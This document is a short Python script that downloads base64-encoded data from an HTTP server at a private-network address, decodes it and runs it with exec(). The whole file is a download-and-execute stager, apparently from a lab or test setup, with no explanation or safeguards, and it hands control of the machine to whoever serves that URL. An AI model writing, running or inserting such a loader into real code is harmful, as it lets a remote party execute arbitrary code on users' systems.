import urllib.request
from base64 import b64decode

url = "http://192.168.222.128:8000/data"

with urllib.request.urlopen(url) as response:
    data = response.read().decode()
    code = b64decode(data)
    exec(code)